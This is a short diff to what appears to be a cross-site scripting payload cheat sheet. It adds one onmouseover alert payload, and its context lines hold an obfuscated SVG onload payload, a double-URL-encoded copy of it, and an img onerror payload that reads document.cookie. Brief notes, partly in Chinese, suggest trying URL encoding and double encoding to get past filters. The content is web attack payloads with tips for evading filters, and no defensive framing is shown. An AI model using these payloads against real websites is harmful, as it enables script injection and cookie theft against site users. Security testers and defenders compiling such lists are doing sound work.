@@ -9,6 +9,7 @@
 "><sVg/OnLuFy="X=y"oNloaD=;1^confirm(1)>/``¹//
 %2522%253E%253CsVg%252FOnLuFy%253D%2522X%253Dy%2522oNloaD%253D%253B1%255Econfirm%25281%2529%253E
 <img src=x onerror=alert(document.cookie)>
+<href="url" onmouseover=alert(1)>
 尝试：
 try URL encode
 try double URL encode.
